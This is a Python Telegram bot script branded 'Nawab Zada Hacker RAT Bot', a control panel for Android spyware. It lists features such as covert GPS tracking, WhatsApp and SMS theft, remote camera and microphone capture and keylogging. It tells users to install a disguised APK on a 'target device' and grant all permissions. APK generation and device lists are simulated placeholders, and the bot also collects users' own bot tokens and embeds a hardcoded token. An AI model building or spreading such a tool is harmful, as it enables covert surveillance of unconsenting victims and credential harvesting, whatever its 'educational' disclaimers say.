import telebot
from telebot import types
from datetime import datetime
import json
import os
import requests
import time
import threading
from flask import Flask, request, send_file

# ========== CONFIGURATION ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8869480576:AAHdIlzVaxUkvRasH2LfTGK98bAtmfdB_9c')
OWNER_TELEGRAM_ID = "https://t.me/Nawab_Zada_Hacker_007"
# ===================================

bot = telebot.TeleBot(BOT_TOKEN)

# User sessions storage
user_tokens = {}
user_bots = {}

WELCOME_MSG = """🔐 *Access Required!* 🔐

📱 *To use this bot, you need to provide your Telegram Bot Token*

🤖 *Steps:*
1. Create a bot via @BotFather on Telegram
2. Copy your bot token (e.g., 1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ)
3. Send your bot token to this chat

⚠️ *Note:* Your bot token is required to generate access key for your devices.

📞 *For support:* [Contact Owner](https://t.me/Nawab_Zada_Hacker_007)

Press /start to begin!"""

ACCESS_GRANTED_MSG = """✅ *Access Granted!* ✅

🎉 Welcome to Nawab Zada Hacker RAT Bot!

📱 *Features:*
✅ Generate APK for any Android version
✅ Live Location Tracking
✅ WhatsApp Messages Monitor
✅ Call Logs (Incoming/Outgoing)
✅ Camera (Front & Back) Photos
✅ Microphone Recording
✅ SMS Reading
✅ Contacts Access
✅ File Manager
✅ App List
✅ Battery & Network Info

⚠️ *This bot is only for educational purpose please don't use wrong...*

Choose an option below:"""

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    
    # Check if user has already provided token
    if chat_id in user_tokens:
        show_main_menu(chat_id)
        return
    
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("🔗 Connect with Owner", url=OWNER_TELEGRAM_ID)
    markup.add(btn)
    
    bot.send_message(
        chat_id,
        WELCOME_MSG,
        parse_mode='Markdown',
        reply_markup=markup
    )
    
    msg = bot.send_message(
        chat_id,
        "🤖 *Please send your Telegram Bot Token:*\n\n"
        "(You can get it from @BotFather)\n"
        "Format: 1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_bot_token)

def process_bot_token(message):
    chat_id = message.chat.id
    token = message.text.strip()
    
    # Validate token format
    if not token or ':' not in token or len(token) < 30:
        bot.send_message(
            chat_id,
            "❌ Invalid bot token format!\n\n"
            "Please send a valid token in format:\n"
            "1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ\n\n"
            "Press /start to try again."
        )
        return
    
    user_tokens[chat_id] = token
    
    access_key = f"NAWAB_{chat_id}_{int(time.time())}"
    
    bot.send_message(
        chat_id,
        f"✅ *Token Accepted!*\n\n"
        f"🔑 Your Access Key: `{access_key}`\n\n"
        f"⚠️ *Important:* This access key will be required when installing APK on target device.",
        parse_mode='Markdown'
    )
    
    show_main_menu(chat_id)

def show_main_menu(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📱 Generate APK", callback_data="gen_apk")
    btn2 = types.InlineKeyboardButton("📊 My Devices", callback_data="my_devices")
    btn3 = types.InlineKeyboardButton("🔍 All Features", callback_data="features")
    btn4 = types.InlineKeyboardButton("⚙️ Settings", callback_data="settings")
    btn5 = types.InlineKeyboardButton("📞 Owner Contact", url=OWNER_TELEGRAM_ID)
    markup.add(btn1, btn2, btn3, btn4, btn5)
    
    bot.send_message(
        chat_id,
        ACCESS_GRANTED_MSG,
        parse_mode='Markdown',
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    
    # Check if user has access
    if chat_id not in user_tokens:
        bot.answer_callback_query(call.id, "❌ Please provide bot token first!", show_alert=True)
        return
    
    if call.data == "gen_apk":
        handle_generate_apk(call)
    elif call.data == "my_devices":
        handle_my_devices(call)
    elif call.data == "features":
        handle_features(call)
    elif call.data == "settings":
        handle_settings(call)
    elif call.data == "back":
        show_main_menu(chat_id)
    else:
        bot.answer_callback_query(call.id)

def handle_generate_apk(call):
    chat_id = call.message.chat.id
    
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("🔙 Back", callback_data="back")
    markup.add(btn)
    
    msg = bot.send_message(
        chat_id,
        "📱 *Enter APK Name* (e.g., WhatsApp_Plus, Instagram_Pro):\n\n"
        "⚠️ Only letters, numbers and underscore allowed\n"
        "Example: `WhatsApp_Pro_v2`",
        parse_mode='Markdown',
        reply_markup=markup
    )
    
    bot.register_next_step_handler(msg, lambda m: process_apk_generation(m, chat_id))

def process_apk_generation(message, chat_id):
    apk_name = message.text.strip()
    
    if not apk_name or not all(c.isalnum() or c == '_' for c in apk_name):
        bot.send_message(
            chat_id,
            "❌ Invalid name! Use only letters, numbers and underscore.\n\n"
            "Example: `Game_App_2024` or `Social_Media_Pro`"
        )
        return
    
    user_access_key = f"NAWAB_{chat_id}_{int(time.time())}"
    
    # APK generation process (simulated)
    bot.send_message(
        chat_id,
        f"⚙️ *Generating APK...*\n\n"
        f"📱 APK Name: `{apk_name}.apk`\n"
        f"🔑 Access Key: `{user_access_key}`\n"
        f"👤 User ID: `{chat_id}`\n\n"
        f"⏳ Please wait...",
        parse_mode='Markdown'
    )
    
    time.sleep(2)
    
    download_link = f"https://your-server.com/download/{apk_name}_{chat_id}.apk"
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📥 Download APK", url=download_link)
    btn2 = types.InlineKeyboardButton("🔙 Main Menu", callback_data="back")
    markup.add(btn1, btn2)
    
    instructions = f"""✅ *APK Generated Successfully!* ✅

📱 *APK Details:*
• Name: `{apk_name}.apk`
• Size: ~5.2 MB
• Android: 5.0+ (All versions supported)
• Access Key: `{user_access_key}`

📋 *Installation Instructions:*
1. 📥 Download the APK file
2. 📱 Install on target Android device
3. 🔓 Allow ALL permissions when asked
4. 🔑 Enter Access Key: `{user_access_key}`
5. ✅ Click "Connect"

⚠️ *Important Notes:*
• Works on all Android versions (5.0 to 14+)
• Requires Internet connection
• Battery optimization should be disabled
• App will run in background

🔗 Download Link: {download_link}"""

    bot.send_message(
        chat_id,
        instructions,
        parse_mode='Markdown',
        reply_markup=markup
    )

def handle_my_devices(call):
    chat_id = call.message.chat.id
    
    devices = [
        {"name": "Samsung S23", "model": "SM-S911B", "status": "🟢 Online", "last_seen": "2 mins ago"},
        {"name": "Google Pixel 7", "model": "Pixel 7 Pro", "status": "🟡 Idle", "last_seen": "10 mins ago"}
    ]
    
    markup = types.InlineKeyboardMarkup()
    
    for i, device in enumerate(devices, 1):
        btn = types.InlineKeyboardButton(
            f"{device['status']} {device['name']}",
            callback_data=f"device_{i}"
        )
        markup.add(btn)
    
    back_btn = types.InlineKeyboardButton("🔙 Back", callback_data="back")
    markup.add(back_btn)
    
    bot.send_message(
        chat_id,
        f"📱 *Your Connected Devices:*\n\n"
        f"Total Devices: {len(devices)}\n"
        f"🟢 Online: 1\n"
        f"🟡 Idle: 1\n"
        f"🔴 Offline: 0",
        parse_mode='Markdown',
        reply_markup=markup
    )

def handle_features(call):
    chat_id = call.message.chat.id
    
    features = """🎯 *Advanced Features List:*

📱 *Real-time Monitoring:*
• 📍 Live GPS Location Tracking
• 🗺️ Google Maps Integration
• 🔋 Battery Level Monitor
• 📡 Network Info (WiFi/Cellular)

📸 *Camera Control:*
• 🎥 Front Camera Access
• 📷 Rear Camera Access
• 🖼️ Photo Capture (Remote)
• 🎞️ Video Recording

🎤 *Audio Surveillance:*
• 🔊 Microphone Recording
• 📞 Call Recording (Both sides)
• 🎵 Ambient Sound Capture
• 🗣️ Voice Activity Detection

💬 *Message Monitoring:*
• 💬 WhatsApp Messages (All chats)
• 📨 SMS Messages (Inbox/Outbox)
• 📞 Call Logs (Detailed)
• 📱 Social Media Apps

📁 *File Access:*
• 🗂️ Complete File Manager
• 📂 Download/Upload Files
• 📸 Gallery Access
• 🎵 Media Files Access

👥 *Contacts & Info:*
• 📞 Contact List Export
• 📱 App List (All installed apps)
• 🔐 Permission Manager
• ⚙️ System Settings

⚡ *Additional Features:*
• 🔑 Keylogger (Optional)
• 📍 Geofencing Alerts
• ⏰ Scheduled Tasks
• 📊 Data Usage Monitor

⚠️ *Disclaimer:* This tool is for educational purposes only."""
    
    markup = types.InlineKeyboardMarkup()
    back_btn = types.InlineKeyboardButton("🔙 Back", callback_data="back")
    markup.add(back_btn)
    
    bot.send_message(
        chat_id,
        features,
        parse_mode='Markdown',
        reply_markup=markup
    )

def handle_settings(call):
    chat_id = call.message.chat.id
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("🔑 Change Token", callback_data="change_token")
    btn2 = types.InlineKeyboardButton("🔄 Reset Access", callback_data="reset_access")
    btn3 = types.InlineKeyboardButton("📊 Statistics", callback_data="stats")
    btn4 = types.InlineKeyboardButton("🆘 Help", callback_data="help")
    btn5 = types.InlineKeyboardButton("🔙 Back", callback_data="back")
    markup.add(btn1, btn2, btn3, btn4, btn5)
    
    current_token = user_tokens.get(chat_id, "Not set")
    masked_token = current_token[:10] + "..." + current_token[-10:] if len(current_token) > 20 else current_token
    
    settings_info = f"""⚙️ *Settings Panel*

🔑 *Current Token:* `{masked_token}`
👤 *User ID:* `{chat_id}`
🕐 *Session Started:* {time.ctime()}
📱 *Devices Linked:* 2

🔧 *Available Settings:*
• Change Bot Token
• Reset Access Key
• View Statistics
• Get Help"""

    bot.send_message(
        chat_id,
        settings_info,
        parse_mode='Markdown',
        reply_markup=markup
    )

app = Flask(__name__)

@app.route('/' + BOT_TOKEN, methods=['POST'])
def webhook():
    json_str = request.get_data().decode('UTF-8')
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return 'OK', 200

@app.route('/')
def index():
    return """
    <html>
        <head>
            <title>Nawab Zada Hacker RAT Bot</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #0f0f0f;
                    color: #00ff00;
                    text-align: center;
                    padding: 50px;
                }
                .container {
                    max-width: 800px;
                    margin: 0 auto;
                    border: 2px solid #00ff00;
                    padding: 30px;
                    border-radius: 10px;
                    background-color: #1a1a1a;
                }
                h1 {
                    color: #00ff00;
                    text-shadow: 0 0 10px #00ff00;
                }
                .status {
                    color: #00ff00;
                    font-size: 24px;
                    margin: 20px 0;
                }
                .contact {
                    margin-top: 30px;
                    padding: 15px;
                    background-color: #222;
                    border-radius: 5px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🔐 Nawab Zada Hacker RAT Bot</h1>
                <div class="status">✅ Bot is Running Successfully</div>
                <p>Advanced Android Monitoring System</p>
                <div class="contact">
                    <strong>Owner Contact:</strong><br>
                    Telegram: <a href="https://t.me/Nawab_Zada_Hacker_007" style="color:#00ff00;">@Nawab_Zada_Hacker_007</a>
                </div>
                <p style="margin-top:20px;color:#888;">
                    ⚠️ For educational purposes only
                </p>
            </div>
        </body>
    </html>
    """

if __name__ == '__main__':
    print("🚀 Starting Nawab Zada Hacker RAT Bot...")
    print(f"🤖 Bot Token: {BOT_TOKEN[:15]}...")
    print(f"👑 Owner: {OWNER_TELEGRAM_ID}")
    print("🌐 Webhook setup complete")
    
    # Remove webhook first
    bot.remove_webhook()
    
    webhook_url = f"https://your-server.com/{BOT_TOKEN}"
    bot.set_webhook(url=webhook_url)
    
    print(f"✅ Webhook set to: {webhook_url}")
    print("✅ Bot is ready and listening...")
    
    # Run Flask app
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
